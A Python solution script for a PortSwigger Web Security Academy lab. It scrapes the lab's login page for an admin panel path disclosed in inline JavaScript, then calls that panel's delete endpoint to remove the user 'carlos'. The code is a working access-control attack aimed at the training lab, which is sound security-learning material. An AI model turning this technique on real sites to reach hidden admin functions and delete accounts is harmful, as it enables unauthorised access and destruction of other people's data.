'''This lab has an unprotected admin panel. It's located at an unpredictable location, but the location is disclosed somewhere in the application.

Solve the lab by accessing the admin panel, and using it to delete the user carlos.

Lab link: https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality-with-unpredictable-url
'''

import requests
import re

lab_id = '0a0e00a2042b4a7880a35897006200e2' # change according to generated lab_id
s = requests.Session()

# The admin url link is hidden on the login page source code. We will examine it to find it
uri = f"https://{lab_id}.web-security-academy.net/login"
r = s.get(uri)
print(r.text)
# The url is found in the adminPanelTag.setAttribute Javascript function. Extract it.
matches = re.search(r"\s*adminPanelTag\.setAttribute\('(.+)',\s*'(\/.+)'\);", r.text)
print(f"found endpoint: {matches[2]}")

# We go directly to the endpoint and delete carlos
admin_endpoint = matches[2]
uri = f"https://{lab_id}.web-security-academy.net{admin_endpoint}/delete?username=carlos"
r2 = s.get(uri)

print('finished')